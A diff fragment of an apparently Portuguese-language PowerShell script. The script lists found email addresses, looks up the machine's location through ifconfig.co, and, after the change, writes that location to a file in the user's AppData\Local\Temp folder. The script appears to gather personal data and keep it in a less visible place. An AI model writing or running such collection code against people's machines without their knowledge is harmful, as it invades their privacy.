@@ -134,7 +134,7 @@ Write-Output "Emails encontrados: $email"
 # Obtem as informações de localização
 $location = Invoke-RestMethod -Uri 'http://ifconfig.co/json' -Method Get
 
-# Cria um ficheiro chamado Location.txt na pasta C:\Users\Escola\3D Objects
+# Cria um ficheiro chamado Location.txt na pasta AppData\Local\Temp
 $location | ConvertTo-Json | Out-File -FilePath "$env:USERPROFILE\AppData\Local\Temp\Location.txt"
 
 # Criar Pasta
